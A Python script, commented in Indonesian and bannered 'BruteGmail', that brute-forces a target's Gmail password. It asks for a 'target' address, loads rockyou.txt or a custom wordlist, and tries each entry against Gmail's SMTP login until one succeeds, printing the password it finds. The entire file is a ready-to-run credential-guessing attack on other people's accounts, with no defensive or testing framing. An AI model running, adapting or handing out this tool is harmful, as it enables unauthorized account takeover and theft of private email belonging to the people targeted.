import smtplib  # Import modul smtplib untuk mengirim email
import sys  # Import modul sys untuk mengakses variabel sistem
from os import system  # Import fungsi system dari modul os untuk mengakses perintah sistem

# Sepanduk ASCII
banner = r"""
┳┓       ┏┓     •┓
┣┫┏┓┓┏╋┏┓┃┓┏┳┓┏┓┓┃
┻┛┛ ┗┻┗┗ ┗┛┛┗┗┗┻┗┗
"""
print(banner)

smtpserver = smtplib.SMTP("smtp.gmail.com", 587) # Membuat objek SMTP untuk server Gmail pada port 587

smtpserver.ehlo() # Berkomunikasi dengan server menggunakan EHLO
smtpserver.starttls() # Mengaktifkan enkripsi TLS untuk komunikasi aman

user = input("Masukkan Alamat Gmail Target => ")  # Meminta pengguna memasukkan alamat email target

print("\n")

pwd = input("Masukkan '0' untuk menggunakan daftar kata sandi bawaan \nMasukkan '2' untuk Menambahkan daftar kata sandi kustom\n => ")
# Meminta pengguna memilih antara menggunakan daftar kata sandi bawaan atau menambahkan daftar kata sandi kustom.
if pwd=='0':
    passswfile="rockyou.txt" # Menggunakan daftar kata sandi bawaan dengan nama file 'rockyou.txt'

elif pwd=='2':
    print("\n")
    passswfile = input("Masukkan Nama Path File (Untuk Daftar Kata Sandi) => ")
    # Meminta pengguna memasukkan nama path file untuk daftar kata sandi kustom
else:
    print("\n")
    print("Input Tidak Valid!")
    sys.exit(1) # Keluar dari program jika input tidak valid
try:
    passswfile = open(passswfile, "r") ## Membuka file daftar kata sandi

except Exception as e:
    print(e)
    sys.exit(1) # Keluar dari program jika terjadi kesalahan saat membuka file

for password in passswfile:
    try:
        smtpserver.login(user, password) # Mencoba login ke server menggunakan alamat email target dan kata sandi dari daftar

        print("[+] Katasandi Ditemukan %s" % password) # Menampilkan pesan jika kata sandi ditemukan
        break # Berhenti mencoba setelah kata sandi ditemukan

    except smtplib.SMTPAuthenticationError:
        print("[!] Kata Sandi Tidak Ditemukan. %s " % password)  # Menampilkan pesan jika kata sandi salah.
        